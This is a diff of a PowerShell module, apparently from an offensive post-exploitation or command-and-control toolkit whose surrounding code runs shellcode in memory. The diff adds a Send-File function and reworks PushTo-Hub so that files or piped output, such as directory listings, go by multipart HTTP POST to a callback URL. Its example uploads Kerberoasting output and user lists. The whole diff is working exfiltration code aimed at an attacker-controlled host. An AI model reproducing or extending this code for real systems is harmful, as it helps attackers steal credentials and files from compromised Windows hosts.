@@ -242,6 +242,36 @@ Execute the shellcode module 47 in memory
 }
 
 
+function Send-File {
+    Param(
+       [Parameter(Mandatory=$True,Position=0)]
+       [String]$Body,
+
+       [Parameter(Mandatory=$False,Position=1)]
+       [String[]]$FileName
+    )
+
+    if (-not $FileName) { $FileName = Get-Date -Format o}
+
+    $boundary = [System.Guid]::NewGuid().ToString()
+    $LF = "`r`n"
+
+    $bodyLines = (
+        "--$boundary",
+        "Content-Disposition: form-data; name=`"file[]`"; filename=`"$FileName`"",
+        "Content-Type: application/octet-stream$LF",
+        $Body,
+        "--$boundary--$LF"
+    ) -join $LF
+
+    try {
+        $response = Invoke-RestMethod -Uri $($CALLBACK_URL + "u") -Method "POST" -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines
+    } catch [System.Net.WebException] {
+         if (-not $_.Exception.Message -match "401")  {throw $_}
+    }
+}
+
+
 function PushTo-Hub {
 <#
 .SYNOPSIS
@@ -252,37 +282,50 @@ Uploads files back to the hub via Cmdlet.
 
 PushTo-Hub kerberoast.txt, users.txt
 
+.EXAMPLE
+
+Get-ChildItem | PushTo-Hub -Name "directory-listing"
+
 Description
 -----------
 Upload the files 'kerberoast.txt' and 'users.txt' via HTTP back to the hub.
 #>
     Param(
-       [Parameter(Mandatory=$True)]
-       [String[]]$Files
+       [Parameter(Mandatory=$False)]
+       [String[]]$Files,
+
+       [Parameter(Mandatory=$False)]
+       [String[]]$Name,
+
+       [Parameter(Mandatory=$False,ValueFromPipeline=$True)]
+       $Stream
     )
 
-    ForEach ($file in $Files) {
-        $abspath = (Resolve-Path $file).path
-        $fileBin = [System.IO.File]::ReadAllBytes($abspath)
-        $enc = [System.Text.Encoding]::GetEncoding("iso-8859-1")
-        $fileEnc = $enc.GetString($fileBin)
+    begin { $result = @() }
+    process {
+        $result = $result + $Stream
+    }
+    end {
+        if ($Files) {
+            ForEach ($file in $Files) {
+                $abspath = (Resolve-Path $file).path
+                $fileBin = [System.IO.File]::ReadAllBytes($abspath)
+                $enc = [System.Text.Encoding]::GetEncoding("iso-8859-1")
+                if ($Name) { $filename = $name } else { $filename = $file }
 
-        $boundary = [System.Guid]::NewGuid().ToString()
-        $LF = "`r`n"
+                $fileEnc = $enc.GetString($fileBin)
 
-        $bodyLines = (
-            "--$boundary",
-            "Content-Disposition: form-data; name=`"file[]`"; filename=`"$file`"",
-            "Content-Type: application/octet-stream$LF",
-            $fileEnc,
-            "--$boundary--$LF"
-        ) -join $LF
+                Send-File $fileEnc $filename
 
-        $url = $CALLBACK_URL
-        try {
-            $response = Invoke-RestMethod -Uri $($url + "u") -Method "POST" -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines
-        } catch [System.Net.WebException] {
-             if (-not $_.Exception.Message -match "401")  {throw $_}
+            }
+        } else {
+            if ($result.length -eq 1 -and $result[0] -is [System.String]) {
+                Send-File $result[0] $Name
+            } else {
+                write-host $result
+                $Body = $result | ConvertTo-Json
+                Send-File $Body $Name
+            }
         }
     }
 }
